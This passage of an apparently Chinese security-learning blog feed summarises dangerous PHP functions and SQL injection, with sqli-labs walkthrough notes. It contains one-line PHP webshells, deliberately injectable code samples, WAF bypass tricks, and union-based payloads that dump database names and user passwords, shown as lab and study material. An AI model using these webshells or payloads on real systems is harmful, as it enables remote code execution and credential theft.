<p><a href="https://zhuanlan.zhihu.com/p/104519509" target="_blank" rel="noopener">小白也看得懂的 Spring IoC 核心流程介绍 - 知乎 (zhihu.com)</a></p>
<p><a href="https://www.jianshu.com/p/6253726f239d" target="_blank" rel="noopener">Spring IOC原理总结 - 简书 (jianshu.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>PHP危险函数总结</title>
    <url>/2020/04/02/php-wei-xian-han-shu-zong-jie/</url>
    <content><![CDATA[<h2 id="php危险函数总结"><a href="#php危险函数总结" class="headerlink" title="php危险函数总结"></a>php危险函数总结</h2><h4 id="什么是危险函数"><a href="#什么是危险函数" class="headerlink" title="什么是危险函数"></a>什么是危险函数</h4><p>​    函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$</span>_GET            </span><br><span class="line"><span class="meta"><span class="meta-keyword">$POST</span></span></span><br><span class="line"><span class="symbol">$</span>_fILES</span><br><span class="line"><span class="symbol">$</span>_COOKIE</span><br><span class="line"><span class="symbol">$</span>_REQUEST		</span><br><span class="line"><span class="symbol">$</span>_SERVER		</span><br><span class="line"><span class="symbol">$</span>_SESSION</span><br></pre></td></tr></table></figure>

<h4 id="执行任意代码的函数"><a href="#执行任意代码的函数" class="headerlink" title="执行任意代码的函数"></a>执行任意代码的函数</h4><ul>
<li>eval函数</li>
<li>assert函数</li>
<li>create_function 函数</li>
<li>preg_replace 函数</li>
<li>call_user_func/call_user_func_array函数</li>
<li>array_map函数</li>
<li>array_filter函数</li>
<li>usort/uasort函数</li>
<li>$a($b)动态函数</li>
</ul>
<h5 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h5><p>eval() 函数把字符串按照 PHP 代码来计算。</p>
<p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
<p><strong>注释：</strong>return 语句会立即终止对字符串的计算。</p>
<p><strong>提示：</strong>该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用。</p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$string</span> = <span class="string">"beautiful"</span><span class="comment">;</span></span><br><span class="line"><span class="variable">$time</span> = <span class="string">"winter"</span><span class="comment">;</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">'This is a <span class="variable">$string</span> <span class="variable">$time</span> morning!'</span><span class="comment">;</span></span><br><span class="line">eval(<span class="string">"\<span class="variable">$str</span> = \"</span><span class="variable">$str</span>\<span class="string">";"</span>)<span class="comment">;</span></span><br><span class="line">echo <span class="variable">$str</span><span class="comment">;</span></span><br><span class="line"></span><br><span class="line">输出为：This is a beautiful winter morning!</span><br></pre></td></tr></table></figure>

<p><strong>简单的一句话木马：</strong><?php eval($_POST['CMD']);?></p>
<h5 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h5><p>assert——检测一个 断言是否为FALSE</p>
<p>如果参数为字符串，它将会被assert()当做php代码来执行</p>
<p>版本只能为：5.x</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">fo</span></span>&#123;</span><br><span class="line">	file_put_contents(<span class="string">"shell.php"</span>, <span class="string">"&lt;?php phpinfo() ?&gt;"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">$func=$_GET[<span class="string">"func"</span>];</span><br><span class="line">assert(<span class="string">"$func()"</span>);</span><br></pre></td></tr></table></figure>

<p>如果我们提交?func=fo，即可写入shell.php</p>
<h5 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h5><p>create_function(string $args, string $code)</p>
<p>适用范围：<code>PHP 4&gt; = 4.0.1</code>，<code>PHP 5</code>，<code>PHP 7</code></p>
<p>功能：根据传递的参数创建匿名函数，并为其返回唯一名称。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">$id=$_GET[<span class="string">'id'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">$str2=<span class="string">'echo'</span>.$a.<span class="string">'"test"'</span>.$id.<span class="string">";"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$f1 = create_function(<span class="string">'$a'</span>, $str2);</span></span><br><span class="line"></span><br><span class="line"><span class="php">$f1(<span class="string">"abc"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218123543.png" alt></p>
<h5 id="preg-replace函数"><a href="#preg-replace函数" class="headerlink" title="preg_replace函数"></a>preg_replace函数</h5><p>preg_replace($pattern,$replacement,$subject,$limit,$count)</p>
<p>示例1：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">"/test/e"</span>, $_GET[<span class="string">"a"</span>], <span class="string">"this is a test"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当我们所要匹配的字符串中含有test时</p>
<p>我们直接传入参数？a=phpinfo()即可执行代码。</p>
<p>示例2：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span>, <span class="string">'test("\1")'</span>, $_GET[<span class="string">"h"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218125837.png" alt></p>
<h5 id="call-user-func-call-user-func-array函数"><a href="#call-user-func-call-user-func-array函数" class="headerlink" title="call_user_func/call_user_func_array函数"></a>call_user_func/call_user_func_array函数</h5><p>call_user_func($callback,$parameter)</p>
<p>调用一个回调函数处理字符串,</p>
<p>call_user_func_array($callback,$param arr)</p>
<p>利用回调函数处理数组。</p>
<p><strong>示例1：</strong></p>
<img src="/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ截图20200218130741.png">

<img src="/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ截图20200218130753.png" style="zoom:67%;">

<p><strong>示例2：</strong></p>
<p>一句话木马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@call_user_func(<span class="string">"assert"</span>,$_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218131820.png" alt></p>
<h5 id="array-map函数"><a href="#array-map函数" class="headerlink" title="array_map函数"></a>array_map函数</h5><p>array_map（$callback,$array1)</p>
<p>​    作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$func=$_GET[<span class="string">"func"</span>];</span><br><span class="line"></span><br><span class="line">$cmd=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">$array[<span class="number">0</span>]=$cmd;</span><br><span class="line"></span><br><span class="line">$new_array=array_map($func,$array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

 <img src="/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ截图20200218133234.png">



<h5 id="array-filter函数"><a href="#array-filter函数" class="headerlink" title="array_filter函数"></a>array_filter函数</h5><p>array_filter() 函数用回调函数过滤数组中的元素。</p>
<p>该函数把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组。数组键名保持不变。</p>
<p>语法：array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">$array1=<span class="keyword">array</span>($cmd);</span><br><span class="line"></span><br><span class="line">$func=$_GET[<span class="string">'func'</span>];</span><br><span class="line"></span><br><span class="line">array_filter($array1,$func);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ截图20200218202542.png" style="zoom:67%;">

<h5 id="usort-uasort函数"><a href="#usort-uasort函数" class="headerlink" title="usort/uasort函数"></a>usort/uasort函数</h5><p><strong>usort</strong></p>
<p>使用用户自定义的比较函数对数组中的值进行排序 </p>
<p>usort(array, cmp_function)；</p>
<p>uasort(array, cmp_function)；</p>
<h5 id="a-b动态函数"><a href="#a-b动态函数" class="headerlink" title="$a$b动态函数"></a>$a$b动态函数</h5><h4 id="读取网络资源的函数"><a href="#读取网络资源的函数" class="headerlink" title="读取网络资源的函数"></a>读取网络资源的函数</h4><p>常见的php读取远程文件的方式</p>
<ul>
<li><p><strong>Fopen()</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$handle=fopen(<span class="string">"http://www.baidu.com"</span>,<span class="string">"rb"</span>);</span><br><span class="line">$contents=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof($handle)) &#123;</span><br><span class="line">	$contents .= fread($handle, <span class="number">8192</span>);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">fclose($handle);</span><br><span class="line"><span class="keyword">echo</span> $contents;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><strong>file_get_content()</strong></li>
</ul>
<ul>
<li><strong>curl</strong></li>
</ul>
<h4 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h4><h5 id="system函数"><a href="#system函数" class="headerlink" title="system函数"></a>system函数</h5><p>system():执行外部程序，并且返回输出</p>
<h5 id="shell-exec-没有回显的命令执行"><a href="#shell-exec-没有回显的命令执行" class="headerlink" title="shell_exec(没有回显的命令执行)"></a>shell_exec(没有回显的命令执行)</h5><p>shell_exec():通过shell环境，并且将完整的输出以字符串方式返回</p>
<h5 id="passthru函数"><a href="#passthru函数" class="headerlink" title="passthru函数"></a>passthru函数</h5><p>执行外部程序并且显示原始输出</p>
<h5 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h5><p>​    exec():执行一个外部程序 </p>
<h5 id="ob-start函数"><a href="#ob-start函数" class="headerlink" title="ob_start函数"></a>ob_start函数</h5><h4 id="操作文件的函数"><a href="#操作文件的函数" class="headerlink" title="操作文件的函数"></a>操作文件的函数</h4><p>常见文件操作函数</p>
<ul>
<li><strong>Copy()</strong></li>
</ul>
<p>copy() 函数拷贝文件</p>
<p>语法：copy(source,destination)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> copy(<span class="string">"source.txt"</span>,<span class="string">"target.txt"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>输出1。</p>
<ul>
<li><p><strong>File_get_contents()/File_put_contents</strong></p>
<ul>
<li><p>file_get_contents() 把整个文件读入一个字符串中。</p>
<p>语法：file_get_contents(path,include_path,context,start,max_length)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> file_get_contents(<span class="string">"test.txt"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>file_put_contents() 函数把一个字符串写入文件中。</p>
<p>语法：int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> file_put_contents(<span class="string">"sites.txt"</span>,<span class="string">"Runoob"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><strong>File()</strong></p>
<ul>
<li><p>file() 函数把整个文件读入一个数组中。</p>
<p>数组中的每个元素都是文件中相应的一行，包括换行符在内</p>
<p>语法：file(path,include_path,context)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">print_r(file(<span class="string">"test.txt"</span>));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><strong>Fopen()</strong></p>
<ul>
<li><p>open() 函数打开一个文件或 URL。</p>
<p>如果 fopen() 失败，它将返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</p>
<p>语法：fopen(filename,mode,include_path,context)</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = <span class="keyword">fopen</span>(<span class="string">"test.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">$file = <span class="keyword">fopen</span>(<span class="string">"/home/test/test.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">$file = <span class="keyword">fopen</span>(<span class="string">"/home/test/test.gif"</span>,<span class="string">"wb"</span>);</span><br><span class="line">$file = <span class="keyword">fopen</span>(<span class="string">"http://www.example.com/"</span>,<span class="string">"r"</span>);</span><br><span class="line">$file = <span class="keyword">fopen</span>(<span class="string">"ftp://user:password@example.com/test.txt"</span>,<span class="string">"w"</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><strong>Move_uploaded_file()</strong></p>
<ul>
<li><p>move_uploaded_file() 函数把上传的文件移动到新位置。</p>
<p>如果成功该函数返回 TRUE，如果失败则返回 FALSE。</p>
<p>语法：move_uploaded_file(file,newloc)</p>
</li>
</ul>
</li>
<li><p><strong>Readfile()</strong></p>
<ul>
<li><p>readfile() 函数读取一个文件，并写入到输出缓冲。</p>
<p>语法：readfile(filename,include_path,context)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> readfile(<span class="string">"test.txt"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><strong>Rename()</strong></p>
<ul>
<li><p>rename() 函数重命名文件或目录。</p>
<p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p>
<p>语法：rename(oldname,newname,context)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">rename(<span class="string">"images"</span>,<span class="string">"pictures"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><strong>Unlink()</strong></p>
<ul>
<li><p>unlink() 函数删除文件。</p>
<p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p>
<p>语法：unlink(filename,context)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$file = <span class="string">"test.txt"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!unlink($file))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> (<span class="string">"Error deleting $file"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> (<span class="string">"Deleted $file"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://wh0ale.github.io/2019/08/21/php代码审计危险函数总结/" target="_blank" rel="noopener">https://wh0ale.github.io/2019/08/21/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/</a></p>
<p><a href="https://blog.csdn.net/qq_43431158/article/details/99673451" target="_blank" rel="noopener">https://blog.csdn.net/qq_43431158/article/details/99673451</a></p>
<p><a href="https://blog.csdn.net/zhezhebie/article/details/80508139" target="_blank" rel="noopener">https://blog.csdn.net/zhezhebie/article/details/80508139</a></p>
]]></content>
      <categories>
        <category>php代码审计学习</category>
      </categories>
      <tags>
        <tag>php危险函数</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入知识点总结+靶场笔记</title>
    <url>/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/</url>
    <content><![CDATA[<h2 id="SQL注入漏洞学习笔记-靶场总结"><a href="#SQL注入漏洞学习笔记-靶场总结" class="headerlink" title="SQL注入漏洞学习笔记+靶场总结"></a>SQL注入漏洞学习笔记+靶场总结</h2><h4 id="mysql相关知识点"><a href="#mysql相关知识点" class="headerlink" title="mysql相关知识点"></a>mysql相关知识点</h4><h5 id="Mysql-5-x数据结构"><a href="#Mysql-5-x数据结构" class="headerlink" title="Mysql 5.x数据结构"></a><strong>Mysql 5.x数据结构</strong></h5><p>​      在Mysql5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata(数据库名)、tables（表名）、columns(列名或字段名)。</p>
<p>​     在schemata表中，schema_name字段用来存储数据库名。</p>
<p>​     在tables表中，table_schema和table_name分别用来存储数据库名和表名。</p>
<p>​    在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)</p>
<p>利用Navicat for MySQL查看结构。</p>
<h5 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a><strong>增删改查</strong></h5><p><strong>SELECT</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">SELECT 列名称 <span class="keyword">FROM</span> 表名称 WHERE 字段<span class="attribute">1</span>=‘条件一’ <span class="keyword">AND</span> 字段<span class="attribute">2</span>=‘条件2’</span><br></pre></td></tr></table></figure>

<p><strong>INSERT</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">INSERT INTO table_name(列1<span class="built_in">..</span>.列2) VALUES(值1<span class="built_in">..</span><span class="built_in">..</span>值2<span class="built_in">..</span><span class="built_in">..</span>)</span><br></pre></td></tr></table></figure>

<p><strong>UPDATE</strong></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 表名称 <span class="keyword">SET</span> 列名称=新值 <span class="keyword">WHERE</span> 列名称=某值</span><br></pre></td></tr></table></figure>

<p><strong>DELETE</strong></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名称 <span class="keyword">WHERE</span> 列名称=值</span><br></pre></td></tr></table></figure>

<h5 id="Mysql常用的几种函数："><a href="#Mysql常用的几种函数：" class="headerlink" title="Mysql常用的几种函数："></a><strong>Mysql常用的几种函数：</strong></h5><ul>
<li>user():查看当前Mysql登录用户名；</li>
<li>database():查看当前使用Mysql数据库名；</li>
<li>version():查看当前Mysql版本。</li>
<li>扩展limit关键字 limit m,n 从m行开始，到m+n行。</li>
</ul>
<h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a><strong>注释</strong></h5><ul>
<li>注释符：在Mysql中常见的注释符表达式：#、–空格、/**/</li>
<li>/<em>！SQL语句、\</em>/只有Mysql可以识别，常用来绕过WAF。</li>
</ul>
<p>例如：<code>select * from articles where id -id ;</code></p>
<p>使用内联注释注入：<code>select * from articles where id=-1 /*!union\*/ /\*!select\*/ 1,2,3,4</code></p>
<h5 id="注入点查找"><a href="#注入点查找" class="headerlink" title="注入点查找"></a>注入点查找</h5><ul>
<li>and 1=1/and 1=2（整型）</li>
<li>随机输入(整型)</li>
<li>-1/+1回显上下页</li>
<li>单引号（字符型/整型）</li>
<li>and sleep(5)(判断页面返回时间)</li>
</ul>
<h4 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h4><p><strong>根据语法：</strong></p>
<p><strong>1.可联合查询注入：</strong></p>
<p>注入前提：能使用union , 页面必须有显示位</p>
<p>注入方法：</p>
<ul>
<li>找到注入点并判断闭合字符</li>
<li>判断数据库类型</li>
<li>猜解列数，爆显示位</li>
<li>得到基本信息（如数据库名、数据库版本等）</li>
<li>猜解表名</li>
<li>得到列名</li>
<li>得到列值</li>
</ul>
<p><strong>2.报错型注入</strong></p>
<p>注入前提：页面没有显示位，源码使用了echo mysql_error输出了错误信息</p>
<p>​                    注入速度快，语句复杂、不能使用group_concat(),只能使用limit依次猜解</p>
<p>注入方法：</p>
<ul>
<li>floor报错注入</li>
</ul>
<p>​      <code>select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</code></p>
<ul>
<li><p>updatexml报错注入</p>
</li>
<li><p>extractvalue报错注入</p>
</li>
</ul>
<p><strong>3.布尔型注入</strong></p>
<p>注入前提：页面存在注入但是没有显示位且源码没有使用echo mysql_error()输出报错信息。</p>
<p>注入方法:</p>
<ul>
<li>?id=1 and (注入语句) # 根据返回结果是否相同来得到数据</li>
<li>主要利用了length()、ascii()、substr()得到结果</li>
</ul>
<p><strong>4.基于时间延迟注入</strong></p>
<p>根据页面返回时间的不同来得到数据</p>
<h5 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h5><p>题目地址：<a href="http://123.206.87.240:9004/1ndex.php?id=1" target="_blank" rel="noopener">http://123.206.87.240:9004/1ndex.php?id=1</a></p>
<p>做题步骤：检测注入=&gt;了解过滤=&gt;获取数据</p>
<h5 id="orderby-注入"><a href="#orderby-注入" class="headerlink" title="orderby 注入"></a>orderby 注入</h5><p><code>select username,password FROM  users order by 1 asc;</code></p>
<p>1.直接加报错注入</p>
<p>2.Rand()方式</p>
<p>3.And payload时间盲注方式</p>
<p>4.其他方式</p>
<p><strong>5.多语句查询(堆叠查询）</strong></p>
<p>注入前提：只在MSSQL数据库存在</p>
<p>注入方法：一个SQL语句后跟分号后再跟一个语句即可执行两个语句。</p>
<p><strong>根据类型：</strong></p>
<ul>
<li>整型</li>
<li>字符串型</li>
<li>搜索型</li>
</ul>
<h5 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h5><ul>
<li>GET</li>
<li>POST</li>
<li>X-Forward-For</li>
<li>Cookie</li>
<li>User-Agent</li>
</ul>
<h4 id="SQL注入绕过机制"><a href="#SQL注入绕过机制" class="headerlink" title="SQL注入绕过机制"></a>SQL注入绕过机制</h4><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>​         如果程序中设置了过滤关键字，但是过滤过程中并没有对关键字组成进行深入分析过滤，导致只是对整体进行过滤。例如：and过滤。当然这种过滤只是发现关键字出现。并不会对关键字进行处理。<br>​    通过修改关键字内字母大小写来绕过过滤措施。例如： AnD 1=1</p>
<p>​     例如，在进行探测当前表的字段数时，使用order by数字进行探测。如果过滤了order,可以使用OrdER来进行绕过。</p>
<h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>如果在程序中设置出现关键字之后替换为空，那么SQL注入攻击也不会发生。对于这样的过滤策略可以使用双写绕过。</p>
<p>例如：过滤了union，我们可以使用ununionion进行绕过。</p>
<h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p>可以利用网络中的URL在线编码，绕过SQL注入的过滤机制。</p>
<img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ截图20200206143207.png" style="zoom:80%;">

<hr>
<h5 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h5><p>在Mysql中内联注释中的内容可以被当做SQL语句执行。</p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206143914.png" alt></p>
<h4 id="sqlmap基础使用方法"><a href="#sqlmap基础使用方法" class="headerlink" title="sqlmap基础使用方法"></a>sqlmap<strong>基础使用方法</strong></h4><h5 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a><strong>sqlmap简介</strong></h5><p>​       sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令</p>
<p>​         sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p>
<p>sqlmap支持五种不同的注入模式：</p>
<ul>
<li>基于布尔的盲注：既可以根据返回页面判断条件真假的注入。</li>
</ul>
<p>​        向数据库发送true或false这样的问题，并根据应用程序赶回的信息判断结果、这种攻击的出现是因为应用程序配置为只显示常规错误，但并没有解决SQL注入存在的代码问题。</p>
<ul>
<li>基于时间的盲注:即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li>
<li>基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li>
<li>联合查询注入：可以使用union的情况下的注入</li>
<li>堆查询注入：可以同时执行多条语句的执行时注入</li>
</ul>
<p><strong>sqlmap常用参数</strong></p>
<ul>
<li><p>-h -help显示基本帮助信息</p>
</li>
<li><p>-hh 显示高级帮助信息并退出</p>
</li>
<li><p>-u指定url</p>
</li>
<li><p>-p指定参数</p>
</li>
<li><p>-D指定数据库</p>
</li>
<li><p>-T指定表</p>
</li>
<li><p>-C指定字段</p>
</li>
<li><p>–current-db当前数据库</p>
</li>
<li><p>–current-user当前用户</p>
</li>
<li><p>–dbs查询所有数据库</p>
</li>
<li><p>–tables查询所有表</p>
</li>
<li><p>–columns查询所有字段名</p>
</li>
<li><p>–dump查询记录</p>
</li>
<li><p>–techniques X(X=B布尔型，E报错型，U联合注入型，T延时型）</p>
</li>
</ul>
<h4 id="sqli-labs靶场实战"><a href="#sqli-labs靶场实战" class="headerlink" title="sqli-labs靶场实战"></a>sqli-labs靶场实战</h4><h5 id="less-1-基于错误的GET单引号字符型注入）"><a href="#less-1-基于错误的GET单引号字符型注入）" class="headerlink" title="less-1 (基于错误的GET单引号字符型注入）"></a>less-1 (基于错误的GET单引号字符型注入）</h5><p><strong>注入过程：</strong></p>
<p><code>?id=1&#39; or 1=1 %23</code></p>
<p><code>?id=1&#39; order by 3 %23</code>  #字段数为3</p>
<p><code>?id=1&#39; union select 1,2,3</code> #显示位为2，3</p>
<p><strong>爆库名</strong></p>
<p><code>?id=1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata) %23</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205184721.png" alt></p>
<p><strong>爆表名</strong></p>
<p><code>?id=1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)%23</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205184704.png" alt></p>
<p><strong>爆列名</strong></p>
<p><code>?id=1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;user&#39;) %23</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205184647.png" alt></p>
<p><strong>爆用户名和密码</strong></p>
<p><code>?id=1&#39; union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) %23</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205184623.png" alt></p>
<p><strong>使用sqlmap自动化探测</strong></p>
<p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --dbs --batch</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205190036.png" alt></p>
